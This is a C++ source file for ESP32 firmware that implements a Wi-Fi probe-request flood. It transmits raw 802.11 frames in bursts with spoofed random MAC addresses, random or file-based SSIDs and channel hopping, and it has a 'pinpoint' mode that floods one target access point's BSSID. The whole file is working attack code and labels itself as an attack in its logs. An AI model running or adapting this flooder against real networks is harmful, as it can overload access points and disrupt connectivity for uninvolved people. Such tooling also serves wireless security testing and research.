#include "ProbeFlooder.h"
#include "App.h"
#include "Logger.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "Config.h"

ProbeFlooder::ProbeFlooder() :
    app_(nullptr),
    isActive_(false),
    currentMode_(ProbeFloodMode::RANDOM),
    currentChannel_(1),
    ssidReader_(),
    packetCounter_(0),
    lastChannelHopTime_(0),
    channelHopIndex_(0)
{}

ProbeFlooder::~ProbeFlooder() {
    // LineReader destructor handles file closing
}

void ProbeFlooder::setup(App* app) {
    app_ = app;
}

bool ProbeFlooder::start(std::unique_ptr<HardwareManager::RfLock> rfLock, ProbeFloodMode mode, const std::string& ssidFilePath) {
    if (isActive_ || mode == ProbeFloodMode::PINPOINT_AP) return false;
    if (!rfLock || !rfLock->isValid()) {
        LOG(LogLevel::ERROR, "PROBE_FLOOD", "Failed to acquire RF hardware lock.");
        return false;
    }
    rfLock_ = std::move(rfLock);
    
    LOG(LogLevel::INFO, "PROBE_FLOOD", "Starting Probe Flood. Mode: %d", (int)mode);
    currentMode_ = mode;
    
    if (currentMode_ == ProbeFloodMode::FILE_BASED) {
        ssidReader_ = SdCardManager::openLineReader(ssidFilePath.c_str());
        if (!ssidReader_.isOpen()) {
            LOG(LogLevel::ERROR, "PROBE_FLOOD", "SSID file is invalid: %s", ssidFilePath.c_str());
            rfLock_.reset();
            return false;
        }
    }

    packetCounter_ = 0;
    channelHopIndex_ = 0;
    currentChannel_ = Channels::WIFI_2_4GHZ[0];
    esp_wifi_set_channel(currentChannel_, WIFI_SECOND_CHAN_NONE);
    lastChannelHopTime_ = millis();
    isActive_ = true;
    
    LOG(LogLevel::INFO, "PROBE_FLOOD", "Attack started on Channel %d.", currentChannel_);
    return true;
}

// --- NEW: Overloaded start for Pinpoint mode ---
bool ProbeFlooder::start(std::unique_ptr<HardwareManager::RfLock> rfLock, const WifiNetworkInfo& targetNetwork) {
    if (isActive_) return false;
    if (!rfLock || !rfLock->isValid()) {
        LOG(LogLevel::ERROR, "PROBE_FLOOD", "Failed to acquire RF hardware lock for pinpoint attack.");
        return false;
    }
    rfLock_ = std::move(rfLock);

    LOG(LogLevel::INFO, "PROBE_FLOOD", "Starting PINPOINT Probe Flood on %s (CH: %ld)", targetNetwork.ssid, targetNetwork.channel);

    currentMode_ = ProbeFloodMode::PINPOINT_AP;
    targetAp_ = targetNetwork;
    packetCounter_ = 0;

    // Set the channel to the target's channel and do not hop
    esp_wifi_set_channel(targetAp_.channel, WIFI_SECOND_CHAN_NONE);
    currentChannel_ = targetAp_.channel;
    
    isActive_ = true;
    return true;
}

void ProbeFlooder::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "PROBE_FLOOD", "Stopping probe flood attack.");
    isActive_ = false;
    ssidReader_.close();
    rfLock_.reset();
}

void ProbeFlooder::loop() {
    if (!isActive_) return;
    
    // --- MODIFIED: Handle different loop logic for different modes ---
    switch (currentMode_) {
        case ProbeFloodMode::RANDOM:
        case ProbeFloodMode::FILE_BASED: {
            // Send a burst of packets on each loop iteration for high throughput
            for (int i = 0; i < 20; ++i) {
                std::string ssid = getNextSsid();
                if (!ssid.empty()) {
                    sendProbePacket(ssid);
                    packetCounter_++;
                } else if (currentMode_ == ProbeFloodMode::FILE_BASED) {
                    // End of file, restart from beginning
                    ssidReader_.close();
                    // This assumes the file path is fixed for this attack type in the menu
                    ssidReader_ = SdCardManager::openLineReader(SD_ROOT::DATA_PROBES_SSID_SESSION);
                }
            }
            // Handle channel hopping
            if (millis() - lastChannelHopTime_ > 250) {
                channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
                currentChannel_ = Channels::WIFI_2_4GHZ[channelHopIndex_];
                esp_wifi_set_channel(currentChannel_, WIFI_SECOND_CHAN_NONE);
                lastChannelHopTime_ = millis();
            }
            break;
        }

        case ProbeFloodMode::PINPOINT_AP: {
            // For pinpoint mode, just send packets as fast as possible on the fixed channel
            for (int i = 0; i < 20; ++i) {
                sendProbePacket(getNextSsid()); // Use random SSIDs to flood
                packetCounter_++;
            }
            break;
        }
    }
}

std::string ProbeFlooder::getNextSsid() {
    if (currentMode_ == ProbeFloodMode::FILE_BASED && ssidReader_.isOpen()) {
        return ssidReader_.readLine().c_str();
    } else { // RANDOM and PINPOINT modes use random SSIDs
        char random_buffer[17]; // Max 16 chars + null
        const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
        int ssid_len = 8 + (esp_random() % 9);
        for (int i = 0; i < ssid_len; ++i) {
            random_buffer[i] = charset[esp_random() % (sizeof(charset) - 2)];
        }
        random_buffer[ssid_len] = '\0';
        return random_buffer;
    }
}

void ProbeFlooder::sendProbePacket(const std::string& ssid) {
    uint8_t packet_buffer[128];
    memcpy(packet_buffer, RawFrames::Mgmt::ProbeRequest::TEMPLATE, sizeof(RawFrames::Mgmt::ProbeRequest::TEMPLATE));

    // --- MODIFIED: Set destination and BSSID based on mode ---
    if (currentMode_ == ProbeFloodMode::PINPOINT_AP) {
        // Destination address = Target AP's BSSID
        memcpy(&packet_buffer[4], targetAp_.bssid, 6);
        // BSSID field = Target AP's BSSID
        memcpy(&packet_buffer[16], targetAp_.bssid, 6);
    }
    // For other modes, the broadcast address from the template is used by default.

    // Set random source MAC address
    for (int i = 0; i < 6; i++) {
        packet_buffer[10 + i] = esp_random() & 0xFF;
    }
    packet_buffer[10] = (packet_buffer[10] & 0xFE) | 0x02;

    uint8_t ssid_len = std::min((int)ssid.length(), 32);
    
    uint8_t* p = packet_buffer + sizeof(RawFrames::Mgmt::ProbeRequest::TEMPLATE);
    *p++ = 0; // Tag: SSID
    *p++ = ssid_len;
    memcpy(p, ssid.c_str(), ssid_len);
    p += ssid_len;
    
    memcpy(p, RawFrames::Mgmt::ProbeRequest::POST_SSID_TAGS, sizeof(RawFrames::Mgmt::ProbeRequest::POST_SSID_TAGS));
    p += sizeof(RawFrames::Mgmt::ProbeRequest::POST_SSID_TAGS);

    int total_len = p - packet_buffer;
    
    esp_wifi_80211_tx(WIFI_IF_STA, packet_buffer, total_len, false);
}

bool ProbeFlooder::isActive() const { return isActive_; }
uint32_t ProbeFlooder::getPacketCounter() const { return packetCounter_; }
int ProbeFlooder::getCurrentChannel() const { return currentChannel_; }
const WifiNetworkInfo& ProbeFlooder::getTargetAp() const { return targetAp_; }
ProbeFloodMode ProbeFlooder::getMode() const { return currentMode_; }